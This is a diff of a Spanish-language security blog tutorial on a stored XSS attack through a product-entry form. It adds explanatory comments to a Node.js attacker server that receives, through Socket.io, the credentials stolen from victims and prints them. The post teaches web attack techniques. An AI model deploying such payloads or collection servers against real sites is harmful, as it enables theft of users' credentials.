@@ -84,6 +84,7 @@ El formulario anterior expuesto permite el ingreso de nuevos productos, los cual
 </figure>
 
 En vez de guardar algun registro con palabras normales, vamos a ingresar el siguiente payload.  
+En resumen, por medio de la libreria **Socket.io**, vamos a enviarnos las credenciales que sean solicitadas a la victima.
 
 {% highlight html %} 
 <!-- Importamos la libreria de socket.io -->
@@ -102,21 +103,26 @@ En vez de guardar algun registro con palabras normales, vamos a ingresar el sigu
 {% endhighlight %}    
 
 En nuestra maquina atacante, vamos a crear un pequeño servidor con nodejs y codificamos lo siguiente:  
-Si desear saber la explicacion a mas detalle con relacion a este desarrollo te invito al siguiente [POST]().  
 
 {% highlight js %}  
+/* Importando la libreria HTTP */ 
 var http = require('http');
+/* Importando la libreria FS */
 var fs = require('fs');
+/* Creamos nuestro servidor haciendo uso de la libreria importada HTTP */
 var server = http.createServer(function(req, res) {
     fs.readFile('./index.html', 'utf-8', function(error, content) {
         res.writeHead(200, {"Content-Type": "text/html"});
         res.end(content);
     });
 });
+
+/* Por medio de socket.io, dejamos en espera el socket llamado message el cual nos ayudara a recibir las credenciales */
 var io = require('socket.io').listen(server);
 io.sockets.on('connection', function (socket) {
     socket.emit('message', 'You are connected!');
     socket.on('message', function (message) {
+    	/* Luego de recibir un socket, vamos a imprimir el resultado en pantalla */
         console.log(message);
     }); 
 });
